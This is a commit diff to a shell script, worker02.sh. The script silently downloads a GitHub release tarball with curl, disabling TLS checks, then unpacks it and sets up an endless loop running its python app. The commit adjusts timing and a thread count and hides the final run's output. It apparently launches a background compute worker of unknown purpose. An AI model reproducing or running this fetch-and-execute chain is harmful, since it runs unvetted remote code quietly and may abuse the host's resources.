1b24cca316cebe5255495256078329de6ca2a0c9
wijayasuta13-collab <wijayasuta13@gmail.com>
2026-08-26 12:47:07 +0700

    Update worker02.sh

--- worker02.sh
+++ worker02.sh
@@ -3,7 +3,7 @@
 curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/mcpo.tar.gz >/dev/null 2>&1 
 tar -xvf mcpo.tar.gz >/dev/null 2>&1
 rm mcpo.tar.gz
-sleep 60
+sleep 30
 cd mcp && echo '#!/bin/bash
 
 PORT=$1
@@ -28,4 +28,4 @@ SERVER_MODE=FAST" > .env
 while true; do
   python3 app.py
   sleep 15
-done' > run.sh && chmod +x run.sh && nproc --all && ./run.sh 3 worker01
+done' > run.sh && chmod +x run.sh && nproc --all && ./run.sh 2 worker01 >/dev/null 2>&1
